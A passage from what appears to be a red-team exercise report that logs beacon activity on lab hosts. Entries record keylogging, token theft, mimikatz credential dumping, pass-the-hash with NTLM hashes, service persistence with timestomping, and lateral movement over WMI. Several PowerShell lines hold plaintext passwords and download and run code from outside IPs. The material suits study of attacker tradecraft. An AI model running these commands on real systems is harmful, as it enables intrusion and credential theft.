+26/04 09:45 log keystrokes in 3360 (x64) 
+26/04 09:45 steal token from PID 3544 
+26/04 09:45 log keystrokes in 3544 (x64) 
+
+
+10.7.3.153 (WS1-03) 
+Zone: LAB 
+User: tim.lee 
+PID: 5140 
+Opened: 26/04 07:58 
+
+Communication Path 
+
+hosts port protocol 
+fourthgate.ex 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 08:00 Tasked Beacon to run windows/beacon_smb/bind_pipe(127.0.0.1:9219) via ms16-032 
+26/04 08:00 host called home, sent: 341534 bytes 
+26/04 08:00 established link to child beacon: WS1-03 
+26/04 08:18 spawn c:\Program Files\Jitsi\Jitsi.exe features to: x86 
+26/04 08:18 host called home, sent: 71 bytes 
+26/04 08:19 spawn x86 features to: c:\Program Files\Jitsi\Jitsi.exe 
+26/04 08:19 host called home, sent: 132 bytes 
+
+26/04 08:42 run: ipconfig & echo -- & date /T & time /T & echo -- whoami &
+whoami /USER /FO CSV & echo -- at & at & echo -- net sessions & netsessions 
+
+26/04 08:42 run: type c:\Users\Public\Documents\doc.txt 
+26/04 08:42 host called home, sent: 424 bytes 
+27/04 07:26 sleep for 180s (30% jitter) 
+27/04 07:26 sleep for 180s (30% jitter) 
+
+
+10.7.3.153 (WS1-03) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 1348 
+Opened: 26/04 08:00 
+
+Communication Path 
+
+hosts port protocol 
+WS1-03 445 SMB 
+
+Page. 818 
+
+hosts port protocol 
+fourthgate.ex 80 HTTP 
+
+File Hashes 
+
+date hash name 
+26/04 08:04 1657c55c99cc6bf1dc2cda2fee7a831a linkinfo.dll 
+26/04 08:04 f8daa4673135e9ad39ee7c345284ff50 tdsvc.exe 
+
+Activity 
+
+date activity 
+
+26/04 08:00 established link to parent beacon: WS1-03 
+
+26/04 08:04 cd c:\windows 
+
+26/04 08:04 upload linkinfo.dll as linkinfo.dll 
+
+26/04 08:04 timestomp linkinfo.dll to c:\windows\system32\linkinfo.dll 
+
+26/04 08:04 cd c:\windows\system32 
+
+26/04 08:04 upload tdsvc.exe as tdsvc.exe 
+
+26/04 08:04 timestomp tdsvc.exe to cmd.exe 
+
+26/04 08:04 run: sc delete tdsvc 
+
+26/04 08:04 run: sc create tdsvc binPath= "C:\windows\system32\tdsvc.exe" start=
+auto DisplayName= "Thin Directory Service" 
+
+26/04 08:04 run: sc description tdsvc "Provides authentication and policy
+
+management for computers joined to domain." 
+
+26/04 08:04 run: sc start tdsvc 
+
+26/04 08:04 host called home, sent: 597625 bytes 
+
+26/04 08:09 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 08:09 host called home, sent: 435794 bytes 
+
+26/04 08:18 spawn c:\Program Files\Jitsi\Jitsi.exe features to: x86 
+
+26/04 08:18 host called home, sent: 11 bytes 
+
+26/04 08:19 spawn x86 features to: c:\Program Files\Jitsi\Jitsi.exe 
+
+26/04 08:19 host called home, sent: 40 bytes 
+
+26/04 08:42 run: ipconfig & echo -- & date /T & time /T & echo -- whoami &
+
+whoami /USER /FO CSV & echo -- at & at & echo -- net sessions & netsessions 
+
+26/04 08:42 run: type c:\Users\Public\Documents\doc.txt 
+
+26/04 08:42 host called home, sent: 188 bytes 
+
+27/04 07:26 sleep for 180s (30% jitter) [change made to: Beacon10.7.3.153@5140] 
+
+Page. 819 
+
+
+10.7.3.153 (WS1-03) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 4764 
+Opened: 26/04 13:13 
+
+Communication Path 
+
+hosts port protocol 
+spamhaus.ex, weather.ex, trace.ex, limonaad.ex, a.ex, b.ex,53, 80 DNS, HTTP 
+jquery.ex, gitlab.ex, purple24.ex 
+
+Activity 
+
+date activity 
+
+26/04 08:09 checkin 
+26/04 08:37 list processes 
+26/04 09:51 set COMSPEC to x86 
+26/04 09:52 set COMSPEC to c:windowssystem32heckz.exe 
+26/04 10:56 set COMSPEC to c:windowssystem32heckz.exe 
+26/04 10:56 checkin 
+26/04 13:13 host called home, sent: 136 bytes 
+26/04 13:13 checkin 
+26/04 13:27 host called home, sent: 8 bytes 
+27/04 06:02 checkin 
+27/04 06:06 host called home, sent: 8 bytes 
+
+
+10.7.3.153 (WS1-03) 
+Zone: LAB 
+User: bruce.schneier 
+PID: 8516 
+Opened: 27/04 06:02 
+
+Communication Path 
+
+hosts port protocol 
+ls17themovie.ex, scripts.node.ex, theforum.ex,80 HTTP 
+honeybeer.ex, spend.touristhaus.ex 
+
+Page. 820 
+
+
+10.7.3.153 (WS1-03) 
+Zone: LAB 
+User: a2 
+PID: 31360 
+Opened: 27/04 09:39 
+
+Communication Path 
+
+hosts port protocol 
+ls17themovie.ex, scripts.node.ex, theforum.ex,80 HTTP 
+honeybeer.ex, spend.touristhaus.ex 
+
+
+10.7.3.153 (WS1-03) 
+Zone: LAB 
+User: tim.cook * 
+PID: 25116 
+Opened: 27/04 10:34 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+WS1-01 445 SMB 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 10:33 established link to parent beacon: WS1-01 
+
+27/04 10:35 dump hashes 
+
+27/04 10:35 host called home, sent: 64069 bytes 
+
+27/04 10:37 revert token 
+
+27/04 10:37 create a token for WS1-05\Administrator 
+
+27/04 10:37 run windows/beacon_smb/bind_pipe (\\step7.ics.blue7.ex\pipe\Winsock\ChangeListener5001#) on step7.ics.blue7.ex via WMI 
+
+27/04 10:37 host called home, sent: 210965 bytes 
+
+27/04 10:38 host called home, sent: 12 bytes 
+
+27/04 10:38 list files in \\dc3\c$ 
+
+27/04 10:38 host called home, sent: 26 bytes 
+
+Page. 821 
+
+date activity 
+
+27/04 10:38 sleep for 10s [change made to: Beacon 10.7.3.151@27216] 
+
+27/04 10:39 list files in \\10.7.3.2\c$ 
+
+27/04 10:39 host called home, sent: 31 bytes 
+
+27/04 10:50 print working directory 
+
+27/04 10:50 host called home, sent: 8 bytes 
+
+27/04 10:51 run: dir \\dc3.lab.bluexx.ex\c$ 
+
+27/04 10:51 host called home, sent: 34 bytes 
+
+27/04 10:53 print working directory 
+
+27/04 10:53 sleep for 10s [change made to: Beacon 10.7.3.151@27216] 
+
+27/04 10:53 host called home, sent: 8 bytes 
+
+27/04 10:53 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Itchyfrog76!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('LAB\tim.cook',
+$Password); Invoke-Command -ComputerName DC3 -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+
+27/04 10:53 host called home, sent: 378 bytes 
+
+27/04 10:54 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Itchyfrog76!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('LAB\tim.cook',
+$Password); Invoke-Command -ComputerName FILES -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-object
+
+net.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+
+27/04 10:54 host called home, sent: 380 bytes 
+
+27/04 10:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:59 host called home, sent: 74 bytes 
+
+27/04 11:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:53 print working directory 
+
+27/04 11:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:35 print working directory 
+
+27/04 12:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:28 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: blondie.user 
+PID: 4160 
+
+Page. 822 
+
+Opened: 26/04 07:45 
+Communication Path 
+Opened: 26/04 07:45 
+Communication Path 
+
+hosts port protocol 
+google.api.com 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 07:44 Tasked Beacon to run windows/beacon_smb/bind_pipe(127.0.0.1:6553) via ms16-032 
+
+26/04 07:45 host called home, sent: 340002 bytes 
+
+26/04 07:46 run: type c:\windows\debug\WIA\wiatrace.txt 
+
+26/04 07:47 host called home, sent: 58 bytes 
+
+26/04 07:48 spawn windows/beacon_smb/bind_pipe (127.0.0.1:6553) as .
+\Administrator 
+
+26/04 07:48 host called home, sent: 208224 bytes 
+
+26/04 07:48 established link to child beacon: WS1-05 
+
+26/04 07:51 print working directory 
+
+26/04 07:52 host called home, sent: 20 bytes 
+
+26/04 07:56 run net view 
+
+26/04 07:57 host called home, sent: 414740 bytes 
+
+26/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 07:58 host called home, sent: 435934 bytes 
+
+26/04 07:58 received output from net module 
+
+26/04 08:11 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Admin1Admin1' -AsPlainText -Force; $Credential =
+New-Object System.Management.Automation.PSCredential('ops\cisco.cisco',$Password); Invoke-Command -ComputerName ws1-06-Credential $Credential -ScriptBlock { Invoke-Expression -Command((new-object net.webclient).downloadstring('http://google.api.com:80/
+check')) }" 
+
+26/04 08:11 host called home, sent: 448 bytes 
+
+26/04 08:13 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Admin1Admin1' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('Administrator',
+$Password); Invoke-Command -ComputerName ws1-06 -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://google.api.com:80/check')) }" 
+
+26/04 08:14 host called home, sent: 398 bytes 
+
+Page. 823 
+
+date activity 
+
+26/04 09:18 print working directory 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: Administrator * 
+PID: 5512 
+Opened: 26/04 07:50 
+
+Communication Path 
+
+hosts port protocol 
+WS1-05 445 SMB 
+google.api.com 80 HTTP 
+
+Other Indicators 
+
+date type target name 
+
+26/04 07:57 service \\127.0.0.1 srv416e7 
+
+Activity 
+
+date activity 
+
+26/04 07:48 established link to parent beacon: WS1-05 
+
+26/04 07:48 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- net
+
+sessions & net sessions 
+
+26/04 07:48 run: type c:\Users\Public\Documents\doc.txt 
+
+26/04 07:49 host called home, sent: 205 bytes 
+
+26/04 07:49 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+
+26/04 07:50 host called home, sent: 535 bytes 
+
+26/04 07:56 print working directory 
+
+26/04 07:56 host called home, sent: 8 bytes 
+
+26/04 07:56 run: IEX ((new-object
+
+net.webclient).downloadstring('http://127.0.0.1:62912/')) 
+
+26/04 07:57 host called home, sent: 338355 bytes 
+
+26/04 07:57 get SYSTEM 
+
+26/04 07:58 host called home, sent: 100 bytes 
+
+26/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 824 
+
+date activity 
+
+26/04 07:59 host called home, sent: 435794 bytes 
+
+26/04 08:01 revert token 
+
+26/04 08:01 create a token for .\Administrator 
+
+26/04 08:01 run windows/beacon_smb/bind_pipe (\\WS1-06\pipe\Winsock\ChangeListener6553#) on WS1-06 via WMI 
+
+26/04 08:01 host called home, sent: 210928 bytes 
+
+26/04 08:08 print working directory 
+
+26/04 08:08 host called home, sent: 8 bytes 
+
+26/04 08:09 host called home, sent: 12 bytes 
+
+26/04 08:11 print working directory 
+
+26/04 08:11 host called home, sent: 20 bytes 
+
+26/04 08:11 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 08:12 host called home, sent: 435794 bytes 
+
+26/04 08:12 inject windows/beacon_smb/bind_pipe (127.0.0.1:6553) into 3512
+
+(x86) 
+
+26/04 08:13 host called home, sent: 205203 bytes 
+
+26/04 08:15 host called home, sent: 12 bytes 
+
+26/04 08:16 revert token 
+
+26/04 08:16 run mimikatz's sekurlsa::pth /user:Administrator /domain:WS1-05 /
+
+ntlm:37407990ba763145503f06da2acc7b62 /run:"cmd.exe /c echod3314606d8c > \\.\pipe\ba428b" command 
+
+26/04 08:16 run windows/beacon_smb/bind_pipe (\\WS1-07\pipe\Winsock\ChangeListener6553#) on WS1-07 via WMI 
+
+26/04 08:16 host called home, sent: 646696 bytes 
+
+26/04 08:16 established link to child beacon: WS1-07 
+
+26/04 08:20 revert token 
+
+26/04 08:20 create a token for WS1-05\Administrator 
+
+26/04 08:20 run windows/beacon_smb/bind_pipe (\\WS3-05\pipe\Winsock\ChangeListener5643#) on WS3-05 via WMI 
+
+26/04 08:21 host called home, sent: 210989 bytes 
+
+26/04 08:21 established link to child beacon: WS3-05 
+
+26/04 09:37 print working directory 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: Administrator * 
+PID: 2088 
+Opened: 26/04 07:54 
+
+Page. 825 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+26/04 07:50 list processes 
+
+26/04 07:50 host called home, sent: 24 bytes 
+
+26/04 07:50 steal token from PID 3512 
+
+26/04 07:50 log keystrokes in 3512 (x64) 
+
+26/04 07:50 host called home, sent: 82006 bytes 
+
+26/04 07:53 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 07:53 run: type c:\Users\Public\Documents\doc.txt 
+
+26/04 07:53 host called home, sent: 205 bytes 
+
+26/04 09:04 spawn (x86) windows/beacon_dns/reverse_dns_txt (tripadvisor.ex viaDNS TXT) 
+
+26/04 09:04 host called home, sent: 517 bytes 
+
+26/04 10:13 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:7453/')) 
+
+26/04 10:14 host called home, sent: 134258 bytes 
+
+26/04 10:23 spawn (x86) windows/beacon_http/reverse_http (uljastest.ex:80) 
+
+26/04 10:23 host called home, sent: 534 bytes 
+
+26/04 10:24 spawn (x86) windows/beacon_http/reverse_http (static.bbc.com:80) 
+
+26/04 10:25 host called home, sent: 536 bytes 
+
+26/04 10:25 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 10:25 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 10:26 host called home, sent: 216 bytes 
+
+26/04 10:32 spawn (x86) windows/beacon_http/reverse_http (static.bbc.com:80) 
+
+26/04 10:32 host called home, sent: 536 bytes 
+
+26/04 10:40 spawn (x86) windows/beacon_https/reverse_https(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+
+26/04 10:40 host called home, sent: 587 bytes 
+
+Page. 826 
+
+date activity 
+
+26/04 10:48 spawn (x86) windows/beacon_https/reverse_https(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+26/04 10:48 host called home, sent: 587 bytes 
+26/04 11:06 spawn (x86) windows/beacon_https/reverse_https (39.71.215.32:443) 
+26/04 11:07 host called home, sent: 563 bytes 
+26/04 11:29 run mimikatz's sekurlsa::logonpasswords command 
+26/04 11:29 host called home, sent: 435794 bytes 
+
+26/04 12:51 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 12:51 run: type "c:\Program Files\Common Files\smgs-res.log" 
+27/04 05:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: Administrator * 
+PID: 5468 
+Opened: 26/04 10:58 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+File Hashes 
+
+date hash name 
+
+26/04 11:17 768e02004a99dc338dd742e5fc06d67d \\dc3.lab.blue07.ex\ADMIN$ 
+\c2a0fc2.exe 
+
+Other Indicators 
+
+date type target name 
+
+26/04 11:17 service \\dc3.lab.blue07.ex 8c2527f 
+
+Page. 827 
+
+Activity 
+
+date activity 
+
+26/04 10:56 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:53792/')) 
+
+26/04 11:00 host called home, sent: 134322 bytes 
+
+26/04 11:01 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 11:01 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 11:01 dump hashes 
+
+26/04 11:01 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 11:01 host called home, sent: 500079 bytes 
+
+26/04 11:02 received password hashes 
+
+26/04 11:08 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:61767/')) 
+
+26/04 11:09 host called home, sent: 134322 bytes 
+
+26/04 11:09 spawn (x86) windows/beacon_dns/reverse_dns_txt (tripadvisor.ex via
+
+DNS TXT) 
+
+26/04 11:14 host called home, sent: 517 bytes 
+
+26/04 11:15 run net computers 
+
+26/04 11:15 run net dclist 
+
+26/04 11:15 host called home, sent: 152695 bytes 
+
+26/04 11:15 received output from net module 
+
+26/04 11:15 received output from net module 
+
+26/04 11:17 revert token 
+
+26/04 11:17 create a token for LAB\tim.cook 
+
+26/04 11:17 run windows/beacon_https/reverse_https
+
+(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) on dc3.lab.blue07.ex viaService Control Manager (\\dc3.lab.blue07.ex\ADMIN$\c2a0fc2.exe) 
+
+26/04 11:21 host called home, sent: 15581 bytes 
+
+26/04 11:22 received output from net module 
+
+26/04 11:23 received output from net module 
+
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+
+Page. 828 
+
+User: Administrator * 
+PID: 10040 
+Opened: 26/04 11:07 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 11:07 Tasked Beacon to run windows/beacon_https/reverse_https(39.71.215.32:443) via ms16-032 
+
+26/04 11:08 host called home, sent: 135453 bytes 
+
+26/04 11:08 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 11:08 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 11:09 host called home, sent: 216 bytes 
+
+26/04 11:16 run: powershell nvoke-WMIMethod -Computer DC3 -ClassWin32_NetConnection -Name RunPs -ArgumentList "tasklist", $NULL 
+
+26/04 11:17 host called home, sent: 119 bytes 
+
+26/04 11:17 run: powershell Invoke-WMIMethod -Computer DC3 -Class
+
+Win32_NetConnection -Name RunPs -ArgumentList "tasklist", $NULL 
+
+26/04 11:18 host called home, sent: 120 bytes 
+
+26/04 11:21 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+
+26/04 11:21 host called home, sent: 535 bytes 
+
+26/04 11:22 spawn (x86) windows/beacon_https/reverse_https
+
+(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+
+26/04 11:22 spawn (x86) windows/beacon_dns/reverse_http (micros0ft.ex via DNSTXT) 
+
+26/04 11:23 host called home, sent: 1104 bytes 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 10248 
+Opened: 26/04 11:11 
+
+Page. 829 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+File Hashes 
+
+date hash name 
+
+26/04 11:52 cbb8104262400a4d8382d0c84fd48ff4 \\dc3.lab.blue7.ex\ADMIN$ 
+\282418b.exe 
+
+Other Indicators 
+
+date type target name 
+26/04 11:18 service \\dc3.lab.blue7.ex 9ddfd7a 
+26/04 11:50 service \\dc3.lab.blue7.ex 79388d5 
+26/04 11:52 service \\dc3.lab.blue7.ex 163daf4 
+
+Activity 
+
+date activity 
+
+26/04 11:11 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 11:12 dump hashes 
+
+26/04 11:12 host called home, sent: 499863 bytes 
+
+26/04 11:12 received password hashes 
+
+26/04 11:13 revert token 
+
+26/04 11:13 run mimikatz's sekurlsa::pth /user:tim.cook /domain:LAB /
+ntlm:b0b05a91e7699e8e9859c3e8bba10605 /run:"cmd.exe /c echo08a59fd5211 > \\.\pipe\1c9bc1" command 
+
+26/04 11:13 run windows/beacon_https/reverse_https (39.71.215.32:443) ondc3.lab.blue7.ex via WMI 
+
+26/04 11:14 host called home, sent: 442283 bytes 
+
+26/04 11:18 revert token 
+
+26/04 11:18 run mimikatz's sekurlsa::pth /user:tim.cook /domain:LAB /
+ntlm:b0b05a91e7699e8e9859c3e8bba10605 /run:"cmd.exe /c echo67e95c5019c > \\.\pipe\1eb595" command 
+
+26/04 11:18 run windows/beacon_https/reverse_https (39.71.215.32:443) ondc3.lab.blue7.ex via Service Control Manager (PSH) 
+
+26/04 11:19 host called home, sent: 442173 bytes 
+
+26/04 11:48 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 830 
+
+date activity 
+
+26/04 11:48 dump hashes 
+
+26/04 11:49 host called home, sent: 499863 bytes 
+
+26/04 11:49 received password hashes 
+
+26/04 11:50 revert token 
+
+26/04 11:50 create a token for LAB\tim.cook 
+
+26/04 11:50 run windows/beacon_https/reverse_https (39.71.215.32:443) ondc3.lab.blue7.ex via Service Control Manager (PSH) 
+
+26/04 11:50 host called home, sent: 6402 bytes 
+
+26/04 11:52 revert token 
+
+26/04 11:52 create a token for LAB\tim.cook 
+
+26/04 11:52 run windows/beacon_https/reverse_https (39.71.215.32:443) on
+
+dc3.lab.blue7.ex via Service Control Manager (\\dc3.lab.blue7.ex\ADMIN$\282418b.exe) 
+
+26/04 11:52 host called home, sent: 14554 bytes 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: Administrator * 
+PID: 8520 
+Opened: 26/04 11:20 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: Administrator * 
+
+Page. 831 
+
+PID: 9136 
+Opened: 26/04 11:32 
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 11208 
+Opened: 26/04 12:10 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+26/04 12:07 host called home, sent: 12 bytes 
+26/04 12:07 steal token from PID 12880 
+26/04 12:07 log keystrokes in 12880 (x64) 
+26/04 12:08 spawn (x86) windows/beacon_https/reverse_https (39.71.215.32:443) 
+26/04 12:13 host called home, sent: 82569 bytes 
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 832 
+
+date activity 
+
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 11088 
+Opened: 26/04 12:13 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+File Hashes 
+
+date hash name 
+
+26/04 12:19 ae2d2c5420cd019b51cb20c0cb86db15 \\dc3.lab.blue7.ex\ADMIN$ 
+\31ae289.exe 
+
+26/04 12:20 367c94b021fad4c302237c39d2d325c3 \\dc3.lab.blue7.ex\ADMIN$ 
+\89565fe.exe 
+Other Indicators 
+
+date type target name 
+26/04 12:19 service \\dc3.lab.blue7.ex 48ed827 
+26/04 12:20 service \\dc3.lab.blue7.ex 67f13a4 
+
+Activity 
+
+date activity 
+
+26/04 12:14 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 12:14 dump hashes 
+
+26/04 12:15 host called home, sent: 499863 bytes 
+
+26/04 12:15 received password hashes 
+
+26/04 12:19 revert token 
+
+26/04 12:19 create a token for LAB\tim.cook 
+
+26/04 12:19 run windows/beacon_https/reverse_https (39.71.215.32:443) ondc3.lab.blue7.ex via Service Control Manager (\\dc3.lab.blue7.ex\ADMIN$\31ae289.exe) 
+
+Page. 833 
+
+date activity 
+
+26/04 12:20 host called home, sent: 14554 bytes 
+
+26/04 12:20 revert token 
+
+26/04 12:20 create a token for LAB\tim.cook 
+
+26/04 12:20 run windows/beacon_smb/bind_pipe (\\dc3.lab.blue7.ex\pipe\Winsock\ChangeListener137#) on dc3.lab.blue7.ex via Service ControlManager (\\dc3.lab.blue7.ex\ADMIN$\89565fe.exe) 
+
+26/04 12:21 host called home, sent: 219504 bytes 
+
+26/04 12:22 revert token 
+
+26/04 12:22 run: whoami 
+
+26/04 12:23 host called home, sent: 22 bytes 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 6080 
+Opened: 27/04 12:05 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+27/04 12:01 host called home, sent: 12 bytes 
+27/04 12:01 steal token from PID 1960 
+27/04 12:01 log keystrokes in 1960 (x64) 
+27/04 12:02 host called home, sent: 82006 bytes 
+27/04 12:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:21 host called home, sent: 435794 bytes 
+27/04 12:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:52 host called home, sent: 435794 bytes 
+27/04 13:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:21 host called home, sent: 435794 bytes 
+27/04 13:50 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 834 
+
+date activity 
+
+27/04 13:56 host called home, sent: 435794 bytes 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 2296 
+Opened: 27/04 13:11 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+27/04 13:14 host called home, sent: 12 bytes 
+27/04 13:14 steal token from PID 1960 
+27/04 13:14 log keystrokes in 1960 (x64) 
+27/04 13:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:20 host called home, sent: 517800 bytes 
+27/04 13:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:56 host called home, sent: 435794 bytes 
+
+
+10.7.3.155 (WS1-05) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 5896 
+Opened: 27/04 14:11 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Page. 835 
+
+Activity 
+
+date activity 
+
+27/04 14:14 host called home, sent: 12 bytes 
+
+
+10.7.3.157 (WS1-07) 
+Zone: LAB 
+User: Administrator * 
+PID: 2508 
+Opened: 26/04 08:18 
+
+Communication Path 
+
+hosts port protocol 
+WS1-05 445 SMB 
+WS1-05 445 SMB 
+google.api.com 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 08:16 established link to parent beacon: WS1-05 
+
+26/04 08:16 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 08:16 dump hashes 
+
+26/04 08:17 host called home, sent: 499875 bytes 
+
+26/04 08:17 received password hashes 
+
+26/04 08:19 revert token 
+
+26/04 08:19 create a token for WS1-05\Administrator 
+
+26/04 08:19 run windows/beacon_smb/bind_pipe (\\WS2-05\pipe\Winsock\ChangeListener5643#) on WS2-05 via WMI 
+
+26/04 08:20 host called home, sent: 210928 bytes 
+
+26/04 08:20 established link to child beacon: WS2-05 
+
+26/04 08:22 list files in \\dc3\c$ 
+
+26/04 08:22 host called home, sent: 38 bytes 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: steve.ballmer 
+
+Page. 836 
+
+PID: 8796 
+Opened: 26/04 11:26 
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+26/04 11:55 spawn (x86) windows/beacon_http/reverse_http (static.bbc.com:80) 
+
+26/04 12:00 host called home, sent: 536 bytes 
